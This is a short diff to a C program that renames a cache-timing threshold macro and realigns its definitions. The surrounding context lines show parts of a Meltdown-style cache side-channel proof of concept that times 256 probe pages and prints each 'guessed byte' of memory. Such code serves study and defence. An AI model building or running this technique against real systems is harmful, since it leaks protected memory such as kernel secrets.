@@ -5,10 +5,10 @@
 #include <x86intrin.h>
 
 
-#define PAGE_SIZE_SHIFT      (0xC)
-#define PAGE_SIZE_SHIFT_STR  "0xC"
-#define PAGE_SIZE            (1 << PAGE_SIZE_SHIFT)
-#define MAX_CACHE_READ_TICKS (80)
+#define PAGE_SIZE_SHIFT            (0xC)
+#define PAGE_SIZE_SHIFT_STR        "0xC"
+#define PAGE_SIZE                  (1 << PAGE_SIZE_SHIFT)
+#define CACHE_READ_THRESHOLD_TICKS (80)
 
 
 static jmp_buf jbuf;
@@ -82,7 +82,7 @@ int main()
             }
 
             for (int i = 0; i < 256; i++) {
-                if (ticks[i] < MAX_CACHE_READ_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
+                if (ticks[i] < CACHE_READ_THRESHOLD_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
                     // if the page is in the cache then the corresponding page shift is most likely the byte value we are guessing
                     printf("guessed byte: 0x%X\n", i);
                 }
